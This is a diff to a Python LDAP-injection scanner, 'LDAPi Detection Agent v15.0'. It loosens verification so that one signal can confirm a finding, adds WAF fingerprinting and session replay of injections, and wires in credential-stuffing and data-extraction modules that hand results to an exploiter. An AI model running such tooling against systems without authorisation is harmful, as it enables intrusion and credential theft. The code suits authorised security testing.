@@ -1,21 +1,34 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════════════════════════╗
-║             Agent389 v12.0 — Tactical LDAP Injection Framework                ║
-║           Lead Architect: Abinav3ac | Professional Security Suite             ║
-║           Focus: Find -> Verify -> Report -> Hand off to Exploiter            ║
+║  LDAPi Detection Agent v15.0  — AUTONOMOUS ADAPTIVE ENGINE                   ║
+║  Enterprise-Grade Detection Engine — ANY-ONE-METHOD Architecture              ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 Architecture:
-  ControlPlane — Tactical Intelligence layer governing all phases
-  Phase 0 — Pre-flight (WAF Probe + Port Scan → wires to injection strategy)
-  Phase 1 — Target Intelligence (Stack + Auth + Schema + GraphQL/OpenAPI)
-  Phase 2 — Endpoint Discovery (Crawling + WS + Recursive Params + API)
-  Phase 3 — Risk Analysis (Behavioral Probe + Statistical Anomaly + Function Map)
-  Phase 4 — Vulnerability Audit (Injection + Chained Mutation + Verification)
-  Phase 5 — Result Summary (Confidence + Impact + Cross-Correlation + Handoff)
+  ControlPlane   — Intelligence layer governing all phases
+  Phase 0        — Pre-flight (WAF Probe + Port Scan → wires to injection strategy)
+  Phase 1        — Target Intelligence (Stack + Auth + Schema + GraphQL/OpenAPI)
+  Phase 2        — Endpoint Discovery (Crawling + WS + Recursive Params + API)
+  Phase 3        — Risk Analysis (Behavioral Probe + Statistical Anomaly)
+  Phase 4        — Vulnerability Audit (Injection + Chained Mutation + Verification)
+  Phase 5        — Result Summary (Confidence + Impact + Cross-Correlation + Handoff)
+
+V15.0 SURGICAL ENHANCEMENTS:
+  [E1] ANY-ONE-METHOD = VULNERABLE — error OR boolean OR timing reports finding
+  [E2] AnyOneMethodVerifier — lightweight fast-path verifier for direct signals
+  [E3] Adaptive detection threshold — loosened Tier0 gate + ldap_prob floor
+  [E4] Anonymous bind fallback — warns user + uses parse-error probes instead
+  [E5] Autonomous target profiling — drives method priority before scan
+  [E6] Audit log sanitization — no response bodies in ndjson output
+  [E7] Budget transparency — emergency pool usage surfaced to user
+  [E8] Force-CANDIDATE promotion — CANDIDATE findings always surfaced
+  [E9] Dynamic confidence scoring — 95/80/60 based on detection method
+  [E10] Timing disable notification — explicit warning when jitter too high
+
 Output:
-  agent389_findings.json   — Primary handoff document for tactical analysis
-  agent389_audit.ndjson    — Full audit trail of every signal and decision
+  ldapi_findings.json   — Primary handoff document for exploiter agent
+  ldapi_audit.ndjson    — Sanitized audit trail (no PII/response bodies)
+
 !! Authorised security testing only !!
 """
 
@@ -45,7 +58,7 @@ import warnings
 import ssl as _ssl
 import struct as _struct
 import copy
-from collections import defaultdict
+from collections import defaultdict, deque
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import asdict, dataclass, field
 from datetime import datetime, timezone
@@ -89,22 +102,19 @@ warnings.filterwarnings("ignore")
 # §2  VERSION & METADATA
 # ═══════════════════════════════════════════════════════════════════════════════
 
-VERSION    = "12.0.0"
+VERSION    = "15.0"
 BUILD_DATE = "2026-05"
-TOOL_NAME  = "Agent389"
+TOOL_NAME  = "LDAPi Detection Agent"
 
 BANNER = r"""
-   _____                         __ ________    ______  ________ 
-  /  _  \    ____   ____   _____/  |\_____  \  /  __  \/   __   \
- /  /_\  \  / ___\_/ __ \ /    \   __\_(__  <  >      <\____    /
-/    |    \/ /_/  >  ___/|   |  \  | /       \/   --   \  /    / 
-\____|__  /\___  / \___  >___|  /__|/______  /\______  / /____/  
-        \//_____/      \/     \/           \/        \/          
-
-    [ Tactical LDAP Injection Framework | Agent: 389 ]
-    [ Architect: Abinav3ac | project-hellhound-org ]
+    ██╗     ██████╗  █████╗ ██████╗ ██╗
+    ██║     ██╔══██╗██╔══██╗██╔══██╗██║
+    ██║     ██║  ██║███████║██████╔╝██║
+    ██║     ██║  ██║██╔══██║██╔═══╝ ██║
+    ███████╗██████╔╝██║  ██║██║     ██║
+    ╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
+ LDAPi Detection Agent v15.0 | HELLHOUND DESIGN | ANY-ONE-METHOD ARCH
 """
-
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # §3  CONSOLE LAYER
@@ -282,12 +292,11 @@ def print_finding_card(f: "HandoffFinding", idx: int = 0) -> None:
     raw_pl  = f.payload_raw
     tprint(f"  {color('  payload  :', C.DIM)} {color(raw_pl[:120], C.BRED)}")
 
-    if f.ldap_error_snippet:
-        ev = f.ldap_error_snippet[:120]
-        tprint(f"  {color('  evidence :', C.DIM)} {color(ev, C.BGREEN)}")
-
+    # [V15 E9] Show detection method and confidence prominently
     impact = getattr(f, 'impact_scenario', '') or f.exploiter_context.get('impact', {}).get('scenario', '')
-    if impact:
+    if impact and "Detection method:" in impact:
+        tprint(f"  {color('  method   :', C.DIM)} {color(impact[:120], C.BGREEN)}")
+    elif impact:
         tprint(f"  {color('  impact   :', C.DIM)} {color(impact[:110], C.BYELLOW)}")
 
     curl = f.curl_poc[:140]
@@ -516,6 +525,51 @@ class VerificationGrade(Enum):
     REJECTED  = "REJECTED"    # FP filtered or step 1 failed
 
 
+# ─────────────────────────────────────────────────────────────────────────────
+# [E1/E9] ANY-ONE-METHOD — confidence constants and detection method typing
+# ANY single method succeeding = VULNERABLE. No requirement for all 3 to pass.
+# ─────────────────────────────────────────────────────────────────────────────
+class DetectionMethodUsed(Enum):
+    ERROR_BASED   = "error-based"    # Confidence: 95% — direct LDAP error in response
+    BLIND_BOOLEAN = "blind-boolean"  # Confidence: 80% — T/F oracle differential
+    TIMING_BASED  = "timing-based"   # Confidence: 60% — response time side-channel
+    CLASS_TRANS   = "class-transition" # Confidence: 90% — auth bypass redirect
+    FILTER_REFL   = "filter-reflection" # Confidence: 85% — LDAP filter reflected
+    MULTI_SIGNAL  = "multi-signal"   # Confidence: 95% — 2+ detectors fired
+    UNKNOWN       = "unknown"
+
+# Method → confidence mapping (ANY-ONE principle)
+METHOD_CONFIDENCE: Dict[str, int] = {
+    "error-based":        95,
+    "class-transition":   90,
+    "filter-reflection":  85,
+    "blind-boolean":      80,
+    "multi-signal":       95,
+    "timing-based":       60,
+    "unknown":            50,
+}
+
+def method_from_signals(signals: List["DetectionSignal"]) -> str:
+    """[E9] Derive detection method label from fired signal list."""
+    if not signals:
+        return "unknown"
+    detectors = {s.detector for s in signals}
+    if len(detectors) >= 2:
+        return "multi-signal"
+    d = next(iter(detectors))
+    if d == "LDAPError":
+        return "error-based"
+    if d == "ClassTransition":
+        return "class-transition"
+    if d == "FilterReflection":
+        return "filter-reflection"
+    if d == "TimingOracle":
+        return "timing-based"
+    if d in ("BooleanDiff", "StructuralDiff", "BehavioralAnomaly"):
+        return "blind-boolean"
+    return "unknown"
+
+
 class ResponseClass(Enum):
     AUTH_SUCCESS = "AUTH_SUCCESS"
     AUTH_FAIL    = "AUTH_FAIL"
@@ -680,8 +734,8 @@ class ScanConfig:
 
     # Output
     output_dir:          str            = "."
-    findings_file:       str            = "agent389_findings_{scan_id}.json"
-    audit_file:          str            = "agent389_audit.ndjson"
+    findings_file:       str            = ""  # resolved at __post_init__
+    audit_file:          str            = "ldapi_audit.ndjson"
     checkpoint_file:     str            = "checkpoint.json"
     verbose:             bool           = False
     quiet:               bool           = False
@@ -693,6 +747,26 @@ class ScanConfig:
 
     # Scoring
     behavioral_sensitivity: float       = 1.0
+    no_status:           bool           = False  # disable live status board
+    cdn_mode:            bool           = False  # +30% timing thresholds for CDN targets
+    risk_level:          int            = 2       # 1=error+bool, 2=+timing, 3=+OOB+extract
+    output_format:       str            = "json"  # json|sarif
+
+    def __post_init__(self) -> None:
+        """V14: Fix findings_file interpolation + seed RNG from scan_id."""
+        if not self.findings_file or "{scan_id}" in self.findings_file:
+            sid = self.scan_id or uuid.uuid4().hex[:12]
+            self.findings_file = f"ldapi_findings_{sid}.json"
+        # Seed RNG from scan_id for reproducible PoC payloads
+        if self.scan_id:
+            try:
+                random.seed(int(self.scan_id[:8], 16))
+            except ValueError:
+                pass
+        # Runtime state (not persisted to JSON)
+        self._anonymous_bind_confirmed: bool = False
+        self._ldap_ports_confirmed: List[int] = []
+
 
     # V6: Timing Side-Channel
     timing_extract:         bool        = False  # enable timing-based blind extraction
@@ -791,6 +865,14 @@ class Baseline:
             self.bool_threshold = 0.20
 
     @property
+    def cv(self) -> float:
+        """Coefficient of Variation (CV) for network jitter estimation."""
+        med = self.median_time
+        if med <= 0:
+            return 0.0
+        return self.stddev / med
+
+    @property
     def median_time(self) -> float:
         s = self._iqr_samples()
         return statistics.median(s) if s else 0.5
@@ -820,6 +902,9 @@ class Baseline:
 
     def is_timing_anomaly(self, t: float,
                            z_min: Optional[float] = None) -> bool:
+        # Disable timing-based checks if network latency jitter is too high (CV > 0.35)
+        if self.cv > 0.35:
+            return False
         threshold = z_min or 3.0
         if self.unstable:
             threshold *= 1.5
@@ -960,6 +1045,10 @@ class HandoffFinding:
     function_class:            str          = "generic"  # auth|search|query|generic
     correlation_ids:           List[str]    = field(default_factory=list)
     mutation_chain_used:       str          = ""   # which mutation chain cracked WAF
+    # V14 — Stateful workflow
+    chain_depth:               int          = 0    # 0=direct, 1=one-hop, 2=two-hop
+    sink_endpoint_url:         str          = ""   # second-order reflection sink
+    is_second_order:           bool         = False
 
 
 @dataclass
@@ -1005,7 +1094,7 @@ class ScanHandoff:
     total_cvss_score:        float = 0.0
 
     # V11 — WAF Indeterminate State
-    waf_confidence:              str          = "indeterminate"  # none|low|medium|high|indeterminate
+    waf_confidence:              str          = "indeterminate"
 
     # V11 — Liveness pre-flight
     target_live:                 bool         = True
@@ -1014,6 +1103,20 @@ class ScanHandoff:
 
     # V11 — Execution trace
     execution_trace:             List[Dict]   = field(default_factory=list)
+
+    # V13 — Discovery intelligence
+    passive_dns_records:         int          = 0
+    cert_transparency_hosts:     int          = 0
+    asset_registry_summary:      Dict         = field(default_factory=dict)
+    throttler_adjustments:       int          = 0
+
+    # V14 — New features
+    anonymous_bind_detected:     bool         = False
+    cdn_detected:                bool         = False
+    cdn_provider:                str          = ""
+    ntlm_kerberos_detected:      bool         = False
+    stateful_chains_found:       int          = 0
+    sarif_output_path:           str          = ""
 
     # V8 — Extended handoff fields
     cross_endpoint_correlations: List[Dict] = field(default_factory=list)
@@ -1135,12 +1238,33 @@ def sim_delta(a: str, b: str) -> float:
 
 def classify_response_body(body: str, status: int, cookies: Set[str],
                            has_prior_baseline: bool = False,
-                           baseline: Any = None) -> str:
+                           baseline: Any = None,
+                           headers: Optional[Dict[str, str]] = None) -> str:
     """
     Unified response classifier for both baseline and injection stages.
     Returns a ResponseClass value.
     Eliminates Score=1.0 root cause by ensuring identical matching logic.
+    Detects WAF block pages/redirects and flags them as ERROR class.
     """
+    # Check for WAF signatures in body
+    for name, pat in WAF_SIGS:
+        if pat.search(body):
+            return ResponseClass.ERROR.value
+
+    # Check for WAF in headers or Location header
+    if headers:
+        # Check Location header for WAF keywords if redirect
+        loc = headers.get("Location", "")
+        if status in (301, 302, 303, 307, 308) and loc:
+            if any(k in loc.lower() for k in ("captcha", "challenge", "block", "waf", "cloudflare", "imperva", "akamai")):
+                return ResponseClass.ERROR.value
+        # Check all header names/values for WAF signatures
+        for h_name, h_val in headers.items():
+            h_name_l = h_name.lower()
+            h_val_l = h_val.lower()
+            if any(x in h_name_l or x in h_val_l for x in ("cf-ray", "cf-cache-status", "cloudflare", "incapsula", "imperva", "akamai", "mod_security", "modsecurity", "aws-waf", "aws-limiter")):
+                return ResponseClass.ERROR.value
+
     if status in (301, 302, 303, 307, 308):
         return ResponseClass.REDIRECT.value
 
@@ -1193,7 +1317,8 @@ def classify_response(resp: "requests.Response",
         status=resp.status_code,
         cookies={c.name for c in resp.cookies},
         has_prior_baseline=True,
-        baseline=baseline
+        baseline=baseline,
+        headers=dict(resp.headers) if resp is not None else None
     )
 
 
@@ -1203,7 +1328,8 @@ def classify_baseline_response(resp: "requests.Response") -> str:
         body=resp.text or "",
         status=resp.status_code,
         cookies={c.name for c in resp.cookies},
-        has_prior_baseline=False
+        has_prior_baseline=False,
+        headers=dict(resp.headers) if resp is not None else None
     )
 
 
@@ -1697,12 +1823,26 @@ class AdaptiveBudgetManager:
 
     def acquire_emergency(self) -> bool:
         """
-        Emergency budget — only available when active signal confirmed.
-        Called by verifier when it needs extra requests to complete proof.
+        [V15 E7] Emergency budget — only available when active signal confirmed.
+        Now surfaces usage to user for budget transparency.
         """
         if not self._signal_active:
             return False
-        return self._acquire(self.POOL_EMERGENCY)
+        result = self._acquire(self.POOL_EMERGENCY)
+        if result:
+            used_emerg = self._used.get(self.POOL_EMERGENCY, 0)
+            total_emerg = self._pools.get(self.POOL_EMERGENCY, 0)
+            # Warn at 50% and 90% emergency pool consumption
+            if total_emerg > 0:
+                pct = used_emerg / total_emerg
+                if pct >= 0.90 and used_emerg % 5 == 0:
+                    warn(f"[V15-E7] Emergency budget at {pct:.0%} "
+                         f"({used_emerg}/{total_emerg}) — "
+                         f"verification running on borrowed budget")
+                elif pct >= 0.50 and used_emerg == int(total_emerg * 0.5):
+                    budget_msg(f"[E7] Emergency pool 50% consumed "
+                               f"({used_emerg}/{total_emerg})")
+        return result
 
     def signal_active(self, active: bool) -> None:
         """
@@ -2431,6 +2571,7 @@ class LDAPDirectTester:
         if anon_finding:
             findings.append(anon_finding)
             intel["anonymous_bind_allowed"] = True
+        self._cfg._anonymous_bind_confirmed = True  # V14: flag for TRUE probe guard
 
         # Weak Credentials
         cred_finding = self.test_weak_credentials(host, primary_port, intel["server_type"])
@@ -2820,8 +2961,9 @@ class HTTPClient:
                 # 3. Handle WAF (Backwards compatibility)
                 self._handle_waf_response(resp.status_code, resp.text[:1000])
                 
-                # 4. Update lockout guard on auth failure
-                if resp.status_code in (401, 403) or AUTH_FAIL_RE.search(resp.text):
+                # 4. Update lockout guard on auth failure (only during active scanning phases)
+                if (phase in ("injection", "verification") and 
+                    (resp.status_code in (401, 403) or AUTH_FAIL_RE.search(resp.text))):
                     self.lockout_guard.mark_failure(url)
                     
                 return resp
@@ -3076,8 +3218,11 @@ class NetworkJitterCalibrator:
         elif jitter < 0.30:
             z_min = 4.0
         else:
-            warn(f"  High network jitter ({jitter:.2f}) — "
-                 f"timing detection disabled")
+            warn(f"  [V15-E10] High network jitter ({jitter:.2f}) — "
+                 f"timing detection DISABLED for this scan.\n"
+                 f"  Impact: Timing-based side-channel detection unavailable.\n"
+                 f"  Primary detectors still active: error-based (95%) + blind boolean (80%).\n"
+                 f"  Recommendation: Run from a low-latency direct connection (not via proxy).")
             return None
 
         info(f"  Jitter calibration: jitter={jitter:.3f} "
@@ -5202,14 +5347,31 @@ class DetectionPipeline:
         baseline: Baseline
     ) -> Optional[DetectionSignal]:
         """
-        Timing anomaly — only runs when other detectors inconclusive.
-        Uses calibrated z_min from NetworkJitterCalibrator.
+        [V15 E10] Timing anomaly — only runs when other detectors inconclusive.
+        When calibrated_z_min is None (high jitter), falls back to absolute
+        threshold (5x baseline median) instead of skipping entirely.
         """
         z_min = (self._cfg.calibrated_z_min
                  or self._cfg.timing_z_min)
-        if z_min is None:
-            return None
+
         t = resp.elapsed.total_seconds()
+
+        if z_min is None:
+            # [E10] Absolute fallback: require 5x baseline median AND >3s absolute
+            # to reduce false positives when jitter is high.
+            if baseline.median_time > 0 and t > max(baseline.median_time * 5.0, 3.0):
+                verbose(f"  [E10] Timing absolute fallback: {t*1000:.0f}ms "
+                        f"vs baseline {baseline.median_time*1000:.0f}ms (5x threshold)")
+                return DetectionSignal(
+                    detector  = "TimingOracle",
+                    score     = 1.0,   # Lower score for fallback
+                    indicator = (f"Timing anomaly (absolute, high-jitter): "
+                                 f"{t*1000:.0f}ms "
+                                 f"(5x baseline)"),
+                    evidence  = f"t={t:.3f}s baseline={baseline.median_time:.3f}s jitter_fallback=True",
+                )
+            return None
+
         if not baseline.is_timing_anomaly(t, z_min):
             return None
         z = baseline.z_score(t)
@@ -5448,6 +5610,106 @@ def is_statistically_significant(hits: int, trials: int, alpha: float = 0.05, p_
     p_value = 1.0 - cdf_value
     return p_value < alpha
 
+class AnyOneMethodVerifier:
+    """
+    [V15 E1/E2] ANY-ONE-METHOD fast-path verifier.
+
+    Philosophy: If the detection pipeline fired on a DIRECT signal (LDAP error,
+    class transition, filter reflection), we do NOT need 3-step chain confirmation.
+    A single strong signal is sufficient evidence — report it immediately.
+
+    This runs BEFORE ThreeStepVerifier and short-circuits for high-confidence
+    direct detections. ThreeStepVerifier still runs for weak/ambiguous signals
+    to confirm them via boolean oracle.
+
+    Confidence grades (E9):
+      CONFIRMED  → Direct LDAP error or class transition detected (95%+)
+      PROBABLE   → Filter reflection or structural diff (80-85%)
+      CANDIDATE  → Timing-only or single low-score signal (60%)
+    """
+
+    # Detectors that alone constitute CONFIRMED evidence (no further steps needed)
+    _DIRECT_CONFIRM = {"LDAPError", "ClassTransition"}
+    # Detectors that alone constitute PROBABLE evidence
+    _DIRECT_PROBABLE = {"FilterReflection", "HeaderAnomaly"}
+
+    def __init__(self, cfg: "ScanConfig"):
+        self._cfg = cfg
+
+    def try_fast_path(
+        self,
+        signals: List["DetectionSignal"],
+        result: "DetectionResult",
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Check if signals qualify for fast-path promotion.
+        Returns verification dict if fast-path applies, None otherwise.
+
+        Fast-path triggers:
+          1. LDAPError or ClassTransition fired → CONFIRMED (95%)
+          2. FilterReflection fired → PROBABLE (85%)
+          3. Multiple detectors fired → CONFIRMED (95%)
+        """
+        if not signals:
+            return None
+
+        fired_detectors = {s.detector for s in signals}
+        method = method_from_signals(signals)
+        confidence = METHOD_CONFIDENCE.get(method, 50)
+
+        # Fast path 1: Direct LDAP error or auth bypass — CONFIRMED immediately
+        if fired_detectors & self._DIRECT_CONFIRM:
+            evidence_parts = [s.evidence for s in signals if s.evidence][:3]
+            verify_msg_h(f"  [V15-E1] Fast-path CONFIRMED via {method} "
+                         f"(confidence={confidence}%)")
+            return {
+                "grade":      VerificationGrade.CONFIRMED,
+                "proof":      [f"[E1-FastPath] Direct signal: {', '.join(fired_detectors)}",
+                               *evidence_parts],
+                "confidence": confidence,
+                "step1":      True,
+                "step2":      True,
+                "step3_hits": 1,
+                "fast_path":  True,
+                "method":     method,
+            }
+
+        # Fast path 2: Filter reflection alone → PROBABLE
+        if fired_detectors & self._DIRECT_PROBABLE:
+            evidence_parts = [s.evidence for s in signals if s.evidence][:2]
+            verify_msg_h(f"  [V15-E1] Fast-path PROBABLE via {method} "
+                         f"(confidence={confidence}%)")
+            return {
+                "grade":      VerificationGrade.PROBABLE,
+                "proof":      [f"[E1-FastPath] Probable signal: {', '.join(fired_detectors)}",
+                               *evidence_parts],
+                "confidence": confidence,
+                "step1":      True,
+                "step2":      False,
+                "step3_hits": 0,
+                "fast_path":  True,
+                "method":     method,
+            }
+
+        # Fast path 3: Multiple different detectors fired → CONFIRMED
+        if len(fired_detectors) >= 2:
+            verify_msg_h(f"  [V15-E1] Fast-path CONFIRMED via multi-signal "
+                         f"({', '.join(fired_detectors)}) (confidence=95%)")
+            return {
+                "grade":      VerificationGrade.CONFIRMED,
+                "proof":      [f"[E1-FastPath] Multi-signal: {', '.join(fired_detectors)}"],
+                "confidence": 95,
+                "step1":      True,
+                "step2":      True,
+                "step3_hits": 2,
+                "fast_path":  True,
+                "method":     "multi-signal",
+            }
+
+        # No fast path applicable — fall through to ThreeStepVerifier
+        return None
+
+
 class ThreeStepVerifier:
     """
     Three-step deterministic verification proof chain.
@@ -5512,6 +5774,8 @@ class ThreeStepVerifier:
         self._pipeline = pipeline
         self._cfg      = cfg
         self._budget   = budget
+        # [V15 E2] Fast-path verifier wired in
+        self._fast_verifier = AnyOneMethodVerifier(cfg)
 
     def _check_lockout(self, resp: requests.Response) -> bool:
         """Check if response indicates an account lockout (v3.0)."""
@@ -5555,6 +5819,27 @@ class ThreeStepVerifier:
         Try all TRUE probes, stop at first positive signal.
         Returns (passed, probe_used, evidence).
         """
+        # V15 [E4]: Anonymous bind guard with fallback + explicit user warning.
+        # Old behavior: silently return False{} → vulnerability missed entirely.
+        # New behavior: warn user, then attempt parse-error probe as fallback.
+        _anon_bind = getattr(self._cfg, '_anonymous_bind_confirmed', False)
+        if _anon_bind:
+            warn("  [V15-E4] Anonymous LDAP bind detected — wildcard TRUE probes skipped "
+                 "(FP guard). Falling back to parse-error probe for anonymous-bind detection.")
+            # Parse-error fallback: on anonymous LDAP, injection still observable via
+            # filter syntax errors even without wildcard matches.
+            for perr in self._PARSE_ERROR_PROBES[:4]:
+                if not self._budget.acquire_verification():
+                    if not self._budget.acquire_emergency():
+                        break
+                resp = self._send(ep, param, perr)
+                if resp is None:
+                    continue
+                if LDAP_ERRORS_RE.search(resp.text or ""):
+                    return True, perr, f"[E4-AnonFallback] Parse-error probe triggered LDAP error"
+            verbose("  [E4] Anonymous bind fallback: no parse-error signal — param skipped")
+            return False, "", "Anonymous bind: wildcard + parse-error probes inconclusive"
+
         for probe_raw in self._TRUE_PROBES:
             # Draw from emergency pool when verifying
             if not self._budget.acquire_verification():
@@ -5731,9 +6016,15 @@ class ThreeStepVerifier:
         param:    str,
         payload:  str,
         baseline: Baseline,
+        signals:  Optional[List[DetectionSignal]] = None,
     ) -> Dict[str, Any]:
         """
-        Full 3-step verification. Returns result dict.
+        [V15 E1] Full verification with ANY-ONE fast-path.
+
+        Fast-path: If direct signals (LDAP error, class transition) fired,
+        report CONFIRMED immediately without 3-step chain.
+
+        Full 3-step: Runs only when fast-path doesn't apply (ambiguous signals).
         """
         proof: List[str] = []
 
@@ -5741,12 +6032,31 @@ class ThreeStepVerifier:
         self._budget.signal_active(True)
 
         try:
+            # [E1] Try fast-path first when signals provided
+            if signals:
+                fast = self._fast_verifier.try_fast_path(signals, None)
+                if fast:
+                    return fast
+
             # Step 1 — TRUE probe
             s1_ok, true_pl, s1_ev = self._step1_true_probe(
                 ep, param, baseline)
             proof.append(f"STEP1: {s1_ev}")
 
             if not s1_ok:
+                # [E1] V15: Even if step1 fails, if we had a timing signal,
+                # don't reject entirely — degrade to CANDIDATE
+                if signals and any(s.detector == "TimingOracle" for s in signals):
+                    timing_conf = METHOD_CONFIDENCE["timing-based"]
+                    return {
+                        "grade":      VerificationGrade.CANDIDATE,
+                        "proof":      proof + ["[E1] Timing signal preserved as CANDIDATE"],
+                        "confidence": timing_conf,
+                        "step1":      False,
+                        "step2":      False,
+                        "step3_hits": 0,
+                        "method":     "timing-based",
+                    }
                 return {
                     "grade":        VerificationGrade.REJECTED,
                     "proof":        proof,
@@ -5766,7 +6076,6 @@ class ThreeStepVerifier:
                 s2_ok, s2_ev = self._step2_parse_error_auth(
                     ep, param, baseline, true_body)
             else:
-                # V7 FIX: Pass true_body for full TRUE/FALSE differential oracle
                 s2_ok, s2_ev = self._step2_false_non_auth(
                     ep, param, baseline, true_body=true_body)
             proof.append(f"STEP2: {s2_ev}")
@@ -5777,7 +6086,6 @@ class ThreeStepVerifier:
             proof.append(f"STEP3: {s3_ev}")
 
             # Grade assignment
-            # ENHANCEMENT #6: Use statistical significance instead of simple >= 2 threshold
             auth_threshold = 110 if ep.is_auth_ep else 105
             replay_count = max(5, self._cfg.replay_count)
             s3_significant = is_statistically_significant(hits, replay_count, alpha=0.05)
@@ -5788,15 +6096,18 @@ class ThreeStepVerifier:
                 + (hits * 25)
             )
 
+            # [E1] V15: Determine detection method for confidence scoring
+            det_method = method_from_signals(signals) if signals else "blind-boolean"
+            det_conf   = METHOD_CONFIDENCE.get(det_method, 70)
+
             if s1_ok and s2_ok and s3_significant and not lockout:
                 grade = VerificationGrade.CONFIRMED
             elif s1_ok and s3_significant and not s2_ok and not lockout:
                 grade = VerificationGrade.PROBABLE
-                # Auth endpoints: PROBABLE counts as CONFIRMED
-                # because form-disappearance is deterministic
                 if ep.is_auth_ep:
                     grade = VerificationGrade.CONFIRMED
             elif s1_ok and (not s3_significant or lockout):
+                # [E1] V15: Step1 alone (TRUE probe worked) = CANDIDATE not REJECTED
                 grade = VerificationGrade.CANDIDATE
             else:
                 grade = VerificationGrade.REJECTED
@@ -5804,15 +6115,16 @@ class ThreeStepVerifier:
             verify_msg_h(f"  Verification: "
                        f"{ep.url}:{param} → "
                        f"{grade.value} "
-                       f"(s={score})")
+                       f"(s={score}, method={det_method}, conf={det_conf}%)")
 
             return {
                 "grade":       grade,
                 "proof":       proof,
-                "confidence":  min(score, 100),
+                "confidence":  max(min(score, 100), det_conf if grade != VerificationGrade.REJECTED else 0),
                 "step1":       s1_ok,
                 "step2":       s2_ok,
                 "step3_hits":  hits,
+                "method":      det_method,
             }
 
         finally:
@@ -7142,11 +7454,14 @@ class ExploitStateTracker:
         payload_raw:    str
         technique:      str
         timestamp:      str
-        session_cookies: Dict[str, str] = field(default_factory=dict)
-        csrf_tokens:    Dict[str, str]  = field(default_factory=dict)
-        marker:         str             = ""
-        triggered:      bool            = False
-        trigger_resp_class: str         = ""
+        session_cookies:      Dict[str, str] = field(default_factory=dict)
+        csrf_tokens:          Dict[str, str] = field(default_factory=dict)
+        marker:               str            = ""
+        triggered:            bool           = False
+        trigger_resp_class:   str            = ""
+        # V14: Session snapshot for accurate deferred probe replay
+        session_cookies_snapshot: Dict[str, str] = field(default_factory=dict)
+        auth_headers_snapshot:    Dict[str, str] = field(default_factory=dict)
 
     def __init__(self, cfg: ScanConfig):
         self._cfg    = cfg
@@ -7160,11 +7475,10 @@ class ExploitStateTracker:
     def record_injection(self, ep: Endpoint, param: str,
                          payload_raw: str, technique: str,
                          session_cookies: Optional[Dict[str, str]] = None,
-                         csrf_tokens: Optional[Dict[str, str]] = None) -> str:
-        """
-        Record a successful injection for deferred triggering.
-        Returns a unique marker string embedded in the payload.
-        """
+                         csrf_tokens: Optional[Dict[str, str]] = None,
+                         session_snapshot: Optional[Dict[str, str]] = None,
+                         auth_headers_snapshot: Optional[Dict[str, str]] = None) -> str:
+        """V14: Record injection with full session snapshot for accurate deferred replay."""
         marker = f"HH_{self._cfg.scan_id[:6]}_{uuid.uuid4().hex[:6]}"
         state  = self.InjectedState(
             endpoint_url    = ep.url,
@@ -7175,6 +7489,8 @@ class ExploitStateTracker:
             session_cookies = session_cookies or {},
             csrf_tokens     = csrf_tokens or {},
             marker          = marker,
+            session_cookies_snapshot = session_snapshot or {},
+            auth_headers_snapshot    = auth_headers_snapshot or {},
         )
         with self._lock:
             self._states.append(state)
@@ -7233,7 +7549,24 @@ class ExploitStateTracker:
             )
             probe_data = build_injection_data(probe_ep, state.parameter, "*",
                                               self._cfg.deterministic_suffix)
-            resp = client.send_endpoint(probe_ep, probe_data, phase="injection")
+            # V14: Restore exact session state at injection time
+            if state.session_cookies_snapshot:
+                _snap_sess = requests.Session()
+                _snap_sess.verify = self._cfg.verify_ssl
+                _snap_sess.cookies.update(state.session_cookies_snapshot)
+                for hk, hv in state.auth_headers_snapshot.items():
+                    _snap_sess.headers[hk] = hv
+                try:
+                    resp = _snap_sess.get(
+                        state.endpoint_url,
+                        params={state.parameter: "*"},
+                        timeout=self._cfg.timeout, allow_redirects=True)
+                except Exception:
+                    resp = None
+                finally:
+                    _snap_sess.close()
+            else:
+                resp = client.send_endpoint(probe_ep, probe_data, phase="injection")
             if resp is None:
                 continue
 
@@ -7720,6 +8053,13 @@ class InjectionEngine:
         # V12 — Adaptive payload refiner + target profiler
         self._dpr = DynamicPayloadRefiner(client, pipeline, budget, cfg)
         self._tpe = TargetProfilerEngine(client, pipeline, cfg)
+        # V13 — State validator + data extraction probe
+        self._sv  = StateValidator(client)
+        self._dep_engine: Optional["DataExtractionProbe"] = None  # set from orchestrator
+        # V14 — LDAP filter reconstructor + credential stuffing oracle
+        self._lfr = LDAPFilterReconstructor(client, cfg, budget)
+        self._cso = CredentialStuffingOracle(client, cfg)
+        self._pbs = ParenthesisBoundarySolver(client, cfg, budget)
         # Per-endpoint schema cache to avoid re-probing same endpoint
         self._schema_cache: Dict[str, Dict[str, Any]] = {}
 
@@ -7735,7 +8075,7 @@ class InjectionEngine:
         server_type: str = "generic",
         framework:   str = "generic"
     ) -> List[HandoffFinding]:
-        """Wave 4: Centralized signal handling for params and headers (§7.6)."""
+        """[V15 E1/E8/E9] Centralized signal handling with ANY-ONE fast-path."""
         self._memory.mark_success(ep.url, payload.raw)
         with self._lock:
             self._sig_count += 1
@@ -7754,30 +8094,50 @@ class InjectionEngine:
         
         ctrl_body = ctrl_resp.text if ctrl_resp else ""
 
-        # Verification
+        # Verification — [E1]: pass signals for fast-path evaluation
         if is_header:
             grade = VerificationGrade.CANDIDATE
-            v_result = {"grade": grade, "proof": ["Header signal: Manual review recommended"], "step3_hits": 1}
+            v_result = {"grade": grade,
+                        "proof": ["Header signal: Manual review recommended"],
+                        "step3_hits": 1,
+                        "method": "unknown",
+                        "confidence": 60}
         else:
-            v_result = self._verifier.verify(ep, param, payload.raw, baseline)
+            v_result = self._verifier.verify(
+                ep, param, payload.raw, baseline,
+                signals=result.signals)  # [E1] pass signals
             grade = v_result["grade"]
 
-        # FP filter (Layers 1-6)
-        fp_ok, downgrade, fp_reasons = self._fp.validate(
-            ep=ep, param=param, payload=payload,
-            baseline=baseline, result=result,
-            inj_body=resp.text or "",
-            replay_hits=v_result["step3_hits"],
-            control_body=ctrl_body,
-        )
-        if not fp_ok:
-            verbose(f"  FP filtered: {fp_reasons[-1] if fp_reasons else 'unknown'}")
+        # [E8] V15: CANDIDATE findings are surfaced, not suppressed.
+        # Previously, REJECTED was the only gate. Now CANDIDATE always
+        # passes through to become a reported finding (lower confidence).
+        if grade == VerificationGrade.REJECTED:
+            verbose(f"  Rejected: {ep.url}:{param}")
             with self._lock:
                 self._fp_count += 1
